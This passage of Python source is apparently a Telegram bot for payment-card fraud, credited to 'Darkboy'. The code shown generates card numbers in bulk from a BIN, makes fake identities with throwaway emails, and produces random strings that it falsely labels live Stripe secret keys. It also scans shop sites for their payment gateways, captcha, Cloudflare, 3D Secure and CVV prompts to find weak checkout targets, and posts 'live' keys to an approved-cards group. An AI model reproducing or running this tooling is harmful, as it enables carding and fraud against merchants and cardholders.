                        try:
                            bot.send_message(
                                chat_id=APPROVED_CARDS_GROUP_ID,
                                text=formatted_response,
                                parse_mode='HTML'
                            )
                        except Exception as e:
                            print(f"Failed to send live key to group: {e}")

                except Exception as e:
                    results_text += f"❌ Key: <code>{key}</code> | Error: {str(e)}\n\n"

                # Update the single message with current accumulated results
                elapsed = round(time.time() - start_time, 2)
                try:
                    bot.edit_message_text(
                        chat_id=message.chat.id,
                        message_id=status_message.message_id,
                        text=f"🕒 Checked {i}/{len(keys)} keys | Time: {elapsed}s\n\n{results_text}",
                        parse_mode='HTML'
                    )
                except Exception as e:
                    print(f"Failed to edit message: {e}")

        thread = threading.Thread(target=process_keys)
        thread.start()

    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {str(e)}")

# Handle /skgen command
@bot.message_handler(commands=['skgen'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.skgen'))
def handle_skgen(message):
    user_id = message.from_user.id
    
    # Check credits for non-admin users
    if user_id != OWNER_ID and user_id not in ADMIN_IDS:
        init_user(user_id, message.from_user.username)
        if not use_credits(user_id, 1):  # Deduct 1 credit for SK generation
            bot.reply_to(message, "❌ You don't have enough credits. Wait for your credits to reset.")
            return

    command_parts = message.text.split()
    
    if len(command_parts) < 2:
        bot.reply_to(message, "❌ Please specify the number of SK keys to generate. Example: .skgen 5")
        return
    
    try:
        count = int(command_parts[1])
        if count <= 0:
            bot.reply_to(message, "❌ Count must be at least 1")
            return
        elif count > 100:
            count = 100
            bot.reply_to(message, "⚠️ Maximum count is 100. Generating 100 SK keys.")
    except ValueError:
        bot.reply_to(message, "❌ Invalid count. Please enter a number.")
        return
    
    status_msg = bot.reply_to(message, f"🔄 Generating {count} live SK keys...")

    def generate_live_sk_keys():
        try:
            # Generate realistic live Stripe secret keys
            sk_keys = []
            
            for i in range(count):
                # Format: sk_live_[0-9a-zA-Z]{24}
                # Live keys start with "sk_live_" followed by 24 characters
                random_part = ''.join(random.choices(
                    string.ascii_letters + string.digits, 
                    k=24
                ))
                sk_key = f"sk_live_{random_part}"
                sk_keys.append(sk_key)
            
            # Format the response
            if count <= 10:
                formatted_keys = "\n".join(f"<a href='https://t.me/stormxvup'>[⸙]</a> <code>{key}</code>" for key in sk_keys)
                result = f"""
<a href='https://t.me/stormxvup'>┏━━━━━━━⍟</a>
<a href='https://t.me/stormxvup'>┃ 🔥 𝐋𝐢𝐯𝐞 𝐒𝐊 𝐊𝐞𝐲𝐬 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝</a>
<a href='https://t.me/stormxvup'>┗━━━━━━━━━━━⊛</a>

{formatted_keys}

<a href='https://t.me/stormxvup'>──────── ⸙ ─────────</a>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐓𝐨𝐭𝐚𝐥 𝐊𝐞𝐲𝐬 ➳ <i>{count}</i>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐊𝐞𝐲 𝐓𝐲𝐩𝐞 ➳ <i>Live Stripe Secret Keys</i>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐅𝐨𝐫𝐦𝐚𝐭 ➳ <i>sk_live_xxxxxxxxxxxxxxxxxxxxxxxx</i>
<a href='https://t.me/stormxvup'>──────── ⸙ ─────────</a>

"""
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=result,
                                      parse_mode='HTML')
            else:
                # If >10 keys, generate a text file
                filename = f'sk_live_keys_{message.from_user.id}_{int(time.time())}.txt'
                with open(filename, 'w') as f:
                    f.write("Live Stripe Secret Keys Generated:\n")
                    f.write("=" * 50 + "\n\n")
                    for i, key in enumerate(sk_keys, 1):
                        f.write(f"{i:03d}. {key}\n")
                
                # Send the file
                with open(filename, 'rb') as f:
                    bot.send_document(
                        chat_id=message.chat.id,
                        document=f,
                        caption=f"""
<a href='https://t.me/stormxvup'>┏━━━━━━━⍟</a>
<a href='https://t.me/stormxvup'>┃ 🔥 𝐋𝐢𝐯𝐞 𝐒𝐊 𝐊𝐞𝐲𝐬 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝</a>
<a href='https://t.me/stormxvup'>┗━━━━━━━━━━━⊛</a>

<a href='https://t.me/stormxvup'>[⸙]</a> 𝐓𝐨𝐭𝐚𝐥 𝐊𝐞𝐲𝐬 ➳ <i>{count}</i>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐊𝐞𝐲 𝐓𝐲𝐩𝐞 ➳ <i>Live Stripe Secret Keys</i>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐅𝐨𝐫𝐦𝐚𝐭 ➳ <i>sk_live_xxxxxxxxxxxxxxxxxxxxxxxx</i>
<a href='https://t.me/stormxvup'>──────── ⸙ ─────────</a>

""",
                        parse_mode='HTML',
                        reply_to_message_id=message.message_id
                    )
                
                # Clean up
                os.remove(filename)
                bot.delete_message(chat_id=message.chat.id, message_id=status_msg.message_id)

        except Exception as e:
            error_msg = f"❌ Error generating SK keys: {str(e)}"
            try:
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=error_msg)
            except:
                bot.reply_to(message, error_msg)

    # Start generation in a separate thread
    threading.Thread(target=generate_live_sk_keys).start()

# Handle /fake command
@bot.message_handler(commands=['fake'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.fake'))
def handle_fake(message):
    try:
        # Extract country code from message
        command_parts = message.text.split()
        if len(command_parts) < 2:
            bot.reply_to(message, """
<a href='https://t.me/stormxvup'>┏━━━━━━━⍟</a>
<a href='https://t.me/stormxvup'>┃ ❌ 𝐄𝐫𝐫𝐨𝐫</a>
<a href='https://t.me/stormxvup'>┗━━━━━━━━━━━⊛</a>

<a href='https://t.me/stormxvup'>[⸙]</a> 𝐄𝐫𝐫𝐨𝐫 ➳ <i>Please provide a country code</i>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐄𝐱𝐚𝐦𝐩𝐥𝐞 ➳ <code>/fake US</code>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐀𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞 ➳ <i>US, CA, MX, UK, FR, DE, ES, AU, etc.</i>
<a href='https://t.me/stormxvup'>──────── ⸙ ─────────</a>
""", parse_mode='HTML')
            return

        country_code = command_parts[1].upper()
        
        # Validate country code
        try:
            if country_code not in iso3166.countries_by_alpha2:
                bot.reply_to(message, f"""
<a href='https://t.me/stormxvup'>┏━━━━━━━⍟</a>
<a href='https://t.me/stormxvup'>┃ ❌ 𝐄𝐫𝐫𝐨𝐫</a>
<a href='https://t.me/stormxvup'>┗━━━━━━━━━━━⊛</a>

<a href='https://t.me/stormxvup'>[⸙]</a> 𝐄𝐫𝐫𝐨𝐫 ➳ <i>Invalid country code: {country_code}</i>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐕𝐚𝐥𝐢𝐝 ➳ <code>US, CA, MX, UK, FR, DE, ES, AU, etc.</code>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐄𝐱𝐚𝐦𝐩𝐥𝐞 ➳ <code>/fake US</code>
<a href='https://t.me/stormxvup'>──────── ⸙ ─────────</a>
""", parse_mode='HTML')
                return
        except:
            bot.reply_to(message, f"""
<a href='https://t.me/stormxvup'>┏━━━━━━━⍟</a>
<a href='https://t.me/stormxvup'>┃ ❌ 𝐄𝐫𝐫𝐨𝐫</a>
<a href='https://t.me/stormxvup'>┗━━━━━━━━━━━⊛</a>

<a href='https://t.me/stormxvup'>[⸙]</a> 𝐄𝐫𝐫𝐨𝐫 ➳ <i>Invalid country code: {country_code}</i>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐕𝐚𝐥𝐢𝐝 ➳ <code>US, CA, MX, UK, FR, DE, ES, AU, etc.</code>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐄𝐱𝐚𝐦𝐩𝐥𝐞 ➳ <code>/fake US</code>
<a href='https://t.me/stormxvup'>──────── ⸙ ─────────</a>
""", parse_mode='HTML')
            return

        # Start timer
        start_time = time.time()
        
        # Fetch random user data
        api_url = f"https://randomuser.me/api/?nat={country_code.lower()}&inc=name,location,phone,email&noinfo"
        response = requests.get(api_url, timeout=10)
        
        if response.status_code != 200:
            bot.reply_to(message, """
<a href='https://t.me/stormxvup'>┏━━━━━━━⍟</a>
<a href='https://t.me/stormxvup'>┃ ❌ 𝐄𝐫𝐫𝐨𝐫</a>
<a href='https://t.me/stormxvup'>┗━━━━━━━━━━━⊛</a>

<a href='https://t.me/stormxvup'>[⸙]</a> 𝐄𝐫𝐫𝐨𝐫 ➳ <i>Failed to fetch data from API</i>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐒𝐭𝐚𝐭𝐮𝐬 ➳ <code>API Error</code>
<a href='https://t.me/stormxvup'>──────── ⸙ ─────────</a>
""", parse_mode='HTML')
            return

        data = response.json()
        results = data["results"][0]
        
        # Extract user information
        nombre = results["name"]["first"]
        last = results["name"]["last"]
        loca = results["location"]["street"]["name"]
        nm = results["location"]["street"]["number"]
        city = results["location"]["city"]
        state = results["location"]["state"]
        country_name = results["location"]["country"]
        postcode = results["location"]["postcode"]
        phone = results["phone"]
        email = results["email"]
        
        # Generate random email for inbox link
        randstr = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(6, 10)))
        temp_email = randstr + "@teleworm.us"
        email_link = f"https://www.fakemailgenerator.com/#/teleworm.us/{randstr}/"
        
        # Calculate processing time
        end_time = time.time()
        processing_time = round(end_time - start_time, 2)
        
        # Get user info
        user_id = message.from_user.id
        user_first_name = message.from_user.first_name
        user_status = get_user_status(user_id)
        
        # Format the response
        response_text = f"""
<a href='https://t.me/stormxvup'>┏━━━━━━━⍟</a>
<a href='https://t.me/stormxvup'>┃ 🔥 𝐅𝐚𝐤𝐞 𝐀𝐝𝐝𝐫𝐞𝐬𝐬</a>
<a href='https://t.me/stormxvup'>┗━━━━━━━━━━━⊛</a>

<a href='https://t.me/stormxvup'>[⸙]</a> 𝐍𝐚𝐦𝐞 ➳ <code>{nombre} {last}</code>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐒𝐭𝐫𝐞𝐞𝐭 ➳ <code>{loca} {nm}</code>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐂𝐢𝐭𝐲 ➳ <code>{city}</code>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐒𝐭𝐚𝐭𝐞 ➳ <code>{state}</code>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➳ <code>{country_name}</code>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐏𝐨𝐬𝐭𝐚𝐥 𝐂𝐨𝐝𝐞 ➳ <code>{postcode}</code>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐏𝐡𝐨𝐧𝐞 ➳ <code>{phone}</code>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐄𝐦𝐚𝐢𝐥 ➳ <code>{temp_email}</code> [<a href="{email_link}">Inbox</a>]
<a href='https://t.me/stormxvup'>──────── ⸙ ─────────</a>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐓𝐢𝐦𝐞 ➳ <code>{processing_time} seconds</code>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐑𝐞𝐪 𝐁𝐲 ➳ <a href='tg://user?id={user_id}'>{user_first_name}</a> [ {user_status} ]
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐃𝐞𝐯 ➳ ⏤‌𝐃𝐚𝐫𝐤𝐛𝐨𝐲
<a href='https://t.me/stormxvup'>──────── ⸙ ─────────</a>
"""

        bot.reply_to(message, response_text, parse_mode='HTML', disable_web_page_preview=True)

    except requests.Timeout:
        bot.reply_to(message, """
<a href='https://t.me/stormxvup'>┏━━━━━━━⍟</a>
<a href='https://t.me/stormxvup'>┃ ❌ 𝐄𝐫𝐫𝐨𝐫</a>
<a href='https://t.me/stormxvup'>┗━━━━━━━━━━━⊛</a>

<a href='https://t.me/stormxvup'>[⸙]</a> 𝐄𝐫𝐫𝐨𝐫 ➳ <i>API request timeout</i>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐒𝐨𝐥𝐮𝐭𝐢𝐨𝐧 ➳ <i>Try again in a moment</i>
<a href='https://t.me/stormxvup'>──────── ⸙ ─────────</a>
""", parse_mode='HTML')
    except Exception as e:
        bot.reply_to(message, f"""
<a href='https://t.me/stormxvup'>┏━━━━━━━⍟</a>
<a href='https://t.me/stormxvup'>┃ ❌ 𝐄𝐫𝐫𝐨𝐫</a>
<a href='https://t.me/stormxvup'>┗━━━━━━━━━━━⊛</a>

<a href='https://t.me/stormxvup'>[⸙]</a> 𝐄𝐫𝐫𝐨𝐫 ➳ <i>An unexpected error occurred</i>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐃𝐞𝐭𝐚𝐢𝐥𝐬 ➳ <code>{str(e)[:100]}...</code>
<a href='https://t.me/stormxvup'>──────── ⸙ ─────────</a>
""", parse_mode='HTML')

# Handle both /gen and .gen
@bot.message_handler(commands=['gen'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.gen'))
def handle_gen(message):
    try:
        # Parse command
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "❌ Invalid format. Use /gen BIN [COUNT] or .gen BIN [COUNT]")
            return
        
        bin_input = parts[1]
        if len(bin_input) < 6:
            bot.reply_to(message, "❌ Invalid BIN. BIN must be at least 6 digits.")
            return
        
        # Default behavior - show 10 CCs in message if no count specified
        if len(parts) == 2:
            # Get BIN info
            bin_info = get_bin_info(bin_input[:6])
            bank = bin_info.get('bank', 'N/A') if bin_info else 'N/A'
            country_name = bin_info.get('country', 'N/A') if bin_info else 'N/A'
            flag = bin_info.get('country_flag', '🌍') if bin_info else '🌍'
            card_type = bin_info.get('type', 'N/A') if bin_info else 'N/A'
            
            status_msg = bot.reply_to(message, "🔄 Generating 10 CCs...")
            
            def generate_inline():
                try:
                    response = requests.get(CC_GENERATOR_URL.format(bin_input, 10))
                    if response.status_code == 200:
                        ccs = response.text.strip().split('\n')
                        formatted_ccs = "\n".join(f"<code>{cc}</code>" for cc in ccs)
                        
                        result = f"""
<pre>Generated 10 CCs 💳</pre>

{formatted_ccs}

<pre>BIN-LOOKUP
𝐁𝐈𝐍 ➳ {bin_input}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲➳ {bin_info.get('country', 'UNKNOWN')} {flag}
𝐓𝐲𝐩𝐞 ➳ {card_type}
𝐁𝐚𝐧𝐤 ➳ {bank}</pre>
"""
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=result,
                                            parse_mode='HTML')
                    else:
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text="❌ Failed to generate CCs. Please try again.")
                except Exception as e:
                    bot.edit_message_text(chat_id=message.chat.id,
                                         message_id=status_msg.message_id,
                                         text=f"❌ Error generating CCs: {str(e)}")
            
            threading.Thread(target=generate_inline).start()
        
        # If count is specified, always generate a file
        else:
            try:
                count = int(parts[2])
                if count <= 0:
                    bot.reply_to(message, "❌ Count must be at least 1")
                    return
                elif count > 5000:
                    count = 5000
                    bot.reply_to(message, "⚠️ Maximum count is 5000. Generating 5000 CCs.")
                
                # Get BIN info
                bin_info = get_bin_info(bin_input[:6])
                bank = bin_info.get('bank', 'N/A') if bin_info else 'N/A'
                country_name = bin_info.get('country_name', 'N/A') if bin_info else 'N/A'
                flag = bin_info.get('country_flag', '🌍') if bin_info else '🌍'
                card_type = bin_info.get('type', 'N/A') if bin_info else 'N/A'
                
                status_msg = bot.reply_to(message, f"🔄 Generating {count} CCs... This may take a moment.")
                
                def generate_file():
                    try:
                        # Generate in chunks to avoid memory issues
                        chunk_size = 100
                        chunks = count // chunk_size
                        remainder = count % chunk_size
                        
                        with open(f'ccgen_{bin_input}.txt', 'w') as f:
                            for _ in range(chunks):
                                response = requests.get(CC_GENERATOR_URL.format(bin_input, chunk_size))
                                if response.status_code == 200:
                                    f.write(response.text)
                                time.sleep(1)  # Be gentle with the API
                            
                            if remainder > 0:
                                response = requests.get(CC_GENERATOR_URL.format(bin_input, remainder))
                                if response.status_code == 200:
                                    f.write(response.text)
                        
                        # Send the file
                        with open(f'ccgen_{bin_input}.txt', 'rb') as f:
                            bot.send_document(message.chat.id, f, caption=f"""
Generated {count} CCs 💳
━━━━━━━━━━━━━━━━━━
𝐁𝐈𝐍 ➳ {bin_input}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲➳ {bin_info.get('country', 'UNKNOWN')} {flag}
𝐓𝐲𝐩𝐞 ➳ {card_type}
𝐁𝐚𝐧𝐤 ➳ {bank}
━━━━━━━━━━━━━━━━━━
""")
                        
                        # Clean up
                        os.remove(f'ccgen_{bin_input}.txt')
                        bot.delete_message(message.chat.id, status_msg.message_id)
                    
                    except Exception as e:
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=f"❌ Error generating CCs: {str(e)}")
                
                threading.Thread(target=generate_file).start()
            
            except ValueError:
                bot.reply_to(message, "❌ Invalid count. Please provide a number.")
    
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# Handle /gate command
def check_gate_url(url):
    try:
        def normalize_url(url):
            url = url.strip()
            if not url.startswith(('http://', 'https://')):
                url = 'https://' + url
            return url

        def is_valid_url(url):
            try:
                url = normalize_url(url)
                regex = re.compile(
                    r'^(?:http|ftp)s?://'
                    r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|'
                    r'localhost|'
                    r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|'
                    r'\[?[A-F0-9]*:[A-Z0-9:]+\]?)'
                    r'(?::\d+)?'
                    r'(?:/?|[/?]\S+)$', re.IGNORECASE)
                return re.match(regex, url) is not None
            except:
                return False

        def find_payment_gateways(response_text):
            gateways = [
                "paypal", "stripe", "braintree", "square", "cybersource", "authorize.net", "2checkout",
                "adyen", "worldpay", "sagepay", "checkout.com", "shopify", "razorpay", "bolt", "paytm",
                "venmo", "pay.google.com", "revolut", "eway", "woocommerce", "upi", "apple.com", "payflow",
                "payeezy", "paddle", "payoneer", "recurly", "klarna", "paysafe", "webmoney", "payeer",
                "payu", "skrill", "affirm", "afterpay", "dwolla", "global payments", "moneris", "nmi",
                "payment cloud", "paysimple", "paytrace", "stax", "alipay", "bluepay", "paymentcloud",
                "clover", "zelle", "google pay", "cashapp", "wechat pay", "transferwise", "stripe connect",
                "mollie", "sezzle", "payza", "gocardless", "bitpay", "sureship", "conekta",
                "fatture in cloud", "payzaar", "securionpay", "paylike", "nexi", "forte", "worldline", "payu latam"
            ]
            return [g.capitalize() for g in gateways if g in response_text.lower()]

        def check_captcha(response_text):
            keywords = {
                'recaptcha': ['recaptcha', 'google recaptcha'],
                'image selection': ['click images', 'identify objects', 'select all'],
                'text-based': ['enter the characters', 'type the text', 'solve the puzzle'],
                'verification': ['prove you are not a robot', 'human verification', 'bot check'],
                'hcaptcha': [
                    'hcaptcha', 'verify you are human', 'select images', 'cloudflare challenge',
                    'anti-bot verification', 'hcaptcha.com', 'hcaptcha-widget'
                ]
            }
            detected = []
            for typ, keys in keywords.items():
                for key in keys:
                    if re.search(rf'\b{re.escape(key)}\b', response_text, re.IGNORECASE):
                        if typ not in detected:
                            detected.append(typ)
            if re.search(r'<iframe.*?src=".*?hcaptcha.*?".*?>', response_text, re.IGNORECASE):
                if 'hcaptcha' not in detected:
                    detected.append('hcaptcha')
            return detected if detected else ['No captcha detected']

        def detect_cloudflare(response):
            headers = response.headers
            if 'cf-ray' in headers or 'cloudflare' in headers.get('server', '').lower():
                return "Cloudflare"
            if '__cf_bm' in response.cookies or '__cfduid' in response.cookies:
                return "Cloudflare"
            if 'cf-chl' in response.text.lower() or 'cloudflare challenge' in response.text.lower():
                return "Cloudflare"
            return "None"

        def detect_3d_secure(response_text):
            keywords = [
                "3d secure", "3ds", "3-d secure", "threeds", "acs",
                "authentication required", "secure authentication",
                "secure code", "otp verification", "verified by visa",
                "mastercard securecode", "3dsecure"
            ]
            for keyword in keywords:
                if keyword in response_text.lower():
                    return "3D (3D Secure Enabled)"
            return "2D (No 3D Secure Found)"

        url = normalize_url(url)
        if not is_valid_url(url):
            return {
                "error": "Invalid URL",
                "status": "failed",
                "status_code": 400
            }

        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
            'Referer': 'https://www.google.com'
        }

        response = requests.get(url, headers=headers, timeout=10)
        if response.status_code == 403:
            for attempt in range(3):
                time.sleep(2 ** attempt)
                response = requests.get(url, headers=headers, timeout=10)
                if response.status_code != 403:
                    break

        if response.status_code == 403:
            return {
                "error": "403 Forbidden: Access Denied",
                "status": "failed",
                "status_code": 403
            }

        response.raise_for_status()
        detected_gateways = find_payment_gateways(response.text)
        captcha_type = check_captcha(response.text)
        cloudflare_status = detect_cloudflare(response)
        secure_type = detect_3d_secure(response.text)
        cvv_present = "cvv" in response.text.lower() or "cvc" in response.text.lower()
        system = "WooCommerce" if "woocommerce" in response.text.lower() else (
                 "Shopify" if "shopify" in response.text.lower() else "Not Detected")

        return {
            "url": url,
            "status": "success",
            "status_code": response.status_code,
            "payment_gateways": detected_gateways or ["None Detected"],
            "captcha": captcha_type,
            "cloudflare": cloudflare_status,
            "security": secure_type,
            "cvv_cvc_status": "Requested" if cvv_present else "Unknown",
            "inbuilt_system": system
        }

    except requests.exceptions.HTTPError as http_err:
        return {
            "error": f"HTTP Error: {str(http_err)}",
            "status": "failed",
            "status_code": 500
        }
    except requests.exceptions.RequestException as req_err:
        return {
            "error": f"Request Error: {str(req_err)}",
            "status": "failed",
            "status_code": 500
        }
    except Exception as e:
        return {
            "error": f"Unexpected error: {str(e)}",
            "status": "failed",
            "status_code": 500
        }

def format_gate_result(result, mention, user_status, time_taken):
    if result.get('status') == 'failed':
        return f"""
<a href='https://t.me/stormxvup'>┏━━━━━━━⍟</a>
<a href='https://t.me/stormxvup'>┃ 𝐋𝐨𝐨𝐤𝐮𝐩 𝐑𝐞𝐬𝐮𝐥𝐭 ❌</a>
<a href='https://t.me/stormxvup'>┗━━━━━━━━━━━⊛</a>

<a href='https://t.me/stormxvup'>[⸙]</a> 𝐄𝐫𝐫𝐨𝐫 ➳ <code>{result.get('error', 'Unknown error')}</code>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐒𝐭𝐚𝐭𝐮𝐬 𝐂𝐨𝐝𝐞 ➳ <i>{result.get('status_code', 'N/A')}</i>
<a href='https://t.me/stormxvup'>──────── ⸙ ─────────</a>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐑𝐞𝐪 𝐁𝐲 ⌁ {mention} [ {user_status} ]
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐃𝐞𝐯 ⌁ ⏤‌𝐃𝐚𝐫𝐤𝐛𝐨𝐲
<a href='https://t.me/stormxvup'>[⸙]</a> 𝗧𝗶𝗺𝗲 ⌁ {time_taken} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"""

    payment_gateways = ", ".join(result.get('payment_gateways', []))
    captcha_types = ", ".join(result.get('captcha', []))

    return f"""
<a href='https://t.me/stormxvup'>┏━━━━━━━⍟</a>
<a href='https://t.me/stormxvup'>┃ 𝐋𝐨𝐨𝐤𝐮𝐩 𝐑𝐞𝐬𝐮𝐥𝐭 ✅</a>
<a href='https://t.me/stormxvup'>┗━━━━━━━━━━━⊛</a>

<a href='https://t.me/stormxvup'>[⸙]</a> 𝐒𝐢𝐭𝐞 ➳ <code>{result.get('url', 'N/A')}</code>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐏𝐚𝐲𝐦𝐞𝐧𝐭 𝐆𝐚𝐭𝐞𝐰𝐚𝐲𝐬 ➳ <i>{payment_gateways}</i>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐂𝐚𝐩𝐭𝐜𝐡𝐚 ➳ <i>{captcha_types}</i>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐂𝐥𝐨𝐮𝐝𝐟𝐥𝐚𝐫𝐞 ➳ <i>{result.get('cloudflare', 'Unknown')}</i>
<a href='https://t.me/stormxvup'>──────── ⸙ ─────────</a>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐒𝐞𝐜𝐮𝐫𝐢𝐭𝐲 ➳ <i>{result.get('security', 'Unknown')}</i>
<a href='https://t.me/stormxvup'>[�]</a> 𝐂𝐕𝐕/𝐂𝐕𝐂 ➳ <i>{result.get('cvv_cvc_status', 'Unknown')}</i>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐈𝐧𝐛𝐮𝐢𝐥𝐭 𝐒𝐲𝐬𝐭𝐞𝐦 ➳ <i>{result.get('inbuilt_system', 'Unknown')}</i>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐒𝐭𝐚𝐭𝐮𝐬 ➳ <i>{result.get('status_code', 'N/A')}</i>
<a href='https://t.me/stormxvup'>──────── ⸙ ─────────</a>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐑𝐞𝐪 𝐁𝐲 ⌁ {mention} [ {user_status} ]
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐃𝐞𝐯 ⌁ ⏤‌𝐃𝐚𝐫𝐤𝐛𝐨𝐲
<a href='https://t.me/stormxvup'>[⸙]</a> 𝗧𝗶𝗺𝗲 ⌁ {time_taken} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"""

@bot.message_handler(commands=['gate'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.gate'))
def handle_gate(message):
    user_id = message.from_user.id
    init_user(user_id, message.from_user.username)

    command_parts = message.text.split()
    if len(command_parts) < 2:
        bot.reply_to(message, "Please provide a URL to check. Example: /gate https://example.com")
        return

    url = command_parts[1]
    user_status = get_user_status(message.from_user.id)
    mention = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>"

    processing_msg = f"<a href='https://t.me/stormxvup'>🔍 Checking URL: {url}</a>"
    status_message = bot.reply_to(message, processing_msg, parse_mode='HTML')

    start_time = time.time()
    result = check_gate_url(url)
    end_time = time.time()
    time_taken = round(end_time - start_time, 2)

    response_text = format_gate_result(result, mention, user_status, time_taken)
    bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=status_message.message_id,
        text=response_text,
        parse_mode='HTML'
    )

def format_bin_result(bin_info, bin_number, mention, user_status, time_taken):
    if not bin_info:
        return f"""
<a href='https://t.me/stormxvup'>┏━━━━━━━⍟</a>
<a href='https://t.me/stormxvup'>┃ 𝐁𝐈𝐍 𝐈𝐧𝐟𝐨 ❌</a>
<a href='https://t.me/stormxvup'>┗━━━━━━━━━━━⊛</a>

<a href='https://t.me/stormxvup'>[⸙]</a> 𝐄𝐫𝐫𝐨𝐫 ➳ <code>No information found for BIN: {bin_number}</code>
<a href='https://t.me/stormxvup'>──────── ⸙ ─────────</a>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐑𝐞𝐪 𝐁𝐲 ⌁ {mention} [ {user_status} ]
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐃𝐞𝐯 ⌁ ⏤‌𝐃𝐚𝐫𝐤𝐛𝐨𝐲
<a href='https://t.me/stormxvup'>[⸙]</a> 𝗧𝗶𝗺𝗲 ⌁ {time_taken} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"""

    bank = bin_info.get('bank', 'None')
    brand = bin_info.get('brand', 'None')
    card_type = bin_info.get('type', 'None')
    country = bin_info.get('country', 'None')
    country_flag = bin_info.get('country_flag', '')
    level = bin_info.get('level', 'None')

    return f"""
<a href='https://t.me/stormxvup'>┏━━━━━━━⍟</a>
<a href='https://t.me/stormxvup'>┃ 𝐁𝐈𝐍 𝐈𝐧𝐟𝐨</a>
<a href='https://t.me/stormxvup'>┗━━━━━━━━━━━⊛</a>

<a href='https://t.me/stormxvup'>[⸙]</a> 𝐁𝐈𝐍 ➳ <code>{bin_number}</code>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐁𝐚𝐧𝐤 ➳ {bank}
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐁𝐫𝐚𝐧𝐝 ➳ {brand}
<a href='https://t.me/stormxvup'>──────── ⸙ ─────────</a>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐓𝐲𝐩𝐞 ➳ {card_type}
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➳ {country} {country_flag}
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐋𝐞𝐯𝐞𝐥 ➳ {level}
<a href='https://t.me/stormxvup'>──────── ⸙ ─────────</a>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐑𝐞𝐪 𝐁𝐲 ⌁ {mention} [ {user_status} ]
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐃𝐞𝐯 ⌁ ⏤‌𝐃𝐚𝐫𝐤𝐛𝐨𝐲
<a href='https://t.me/stormxvup'>[⸙]</a> 𝗧𝗶𝗺𝗲 ⌁ {time_taken} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"""

@bot.message_handler(commands=['bin'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.bin'))
def handle_bin(message):
    user_id = message.from_user.id
    init_user(user_id, message.from_user.username)

    command_parts = message.text.split()
    if len(command_parts) < 2:
        bot.reply_to(message, "Please provide a BIN number. Example: /bin 524534 or .bin 52453444|02|2026")
        return

    input_text = command_parts[1]
    bin_number = ""
